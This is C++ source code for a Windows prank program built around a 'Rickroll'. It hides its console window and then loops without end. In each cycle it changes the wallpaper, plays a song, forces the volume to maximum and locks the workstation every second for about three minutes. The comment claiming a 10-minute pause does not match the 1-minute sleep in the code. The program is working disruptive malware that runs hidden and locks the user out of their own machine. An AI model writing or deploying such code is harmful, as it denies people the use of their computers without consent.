#include <iostream>
#include <string>
#include <Windows.h>
#include <mmsystem.h>
#include <thread>
#include <experimental/filesystem>
#include <atomic>

#pragma comment(lib, "winmm.lib")

std::atomic<bool> terminateThreads(false);

void ChangeBackground() {
    std::experimental::filesystem::path currentPath = std::experimental::filesystem::current_path();
    std::wstring file = (currentPath / L"rick.jpg").wstring();

    // Change the background
    int ret = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)file.c_str(), SPIF_UPDATEINIFILE);
}

void PlayMusic() {
    while (!terminateThreads) {
        PlaySound(TEXT("rickroll.wav"), NULL, SND_SYNC);
        // 3rd party module to play music
    }
}

void LockScreen() {
    while (!terminateThreads) {
        LockWorkStation();
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

void MaxVolume() {
    while (!terminateThreads) {
        keybd_event(VK_VOLUME_UP, 0, 0, 0);
        keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_KEYUP, 0);
    }
}

void DayReminder() {
    const char* url = "index.html";
    ShellExecuteA(NULL, "open", url, NULL, NULL, SW_SHOWNORMAL);
}

void TimerNeverGonnaGiveYouUp() {
    std::this_thread::sleep_for(std::chrono::seconds(190));

    // Set the flag to terminate all threads
    terminateThreads = true;
}

int main() {
	HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

	DayReminder();
	std::this_thread::sleep_for(std::chrono::seconds(10));

    while (true) {
        terminateThreads = false; // Reset the termination flag for each iteration
		ChangeBackground();
		

        std::thread musicThread(PlayMusic);
        std::thread lockScreenThread(LockScreen);
        std::thread maxVolumeThread(MaxVolume);
        std::thread timerThread(TimerNeverGonnaGiveYouUp);

        // Wait for the timer thread to finish
        timerThread.join();

        // Wait for other threads to finish
        musicThread.join();
        lockScreenThread.join();
        maxVolumeThread.join();

        // Sleep for 10 minutes before the next iteration
		std::this_thread::sleep_for(std::chrono::minutes(1));
    }

    return 0;
}
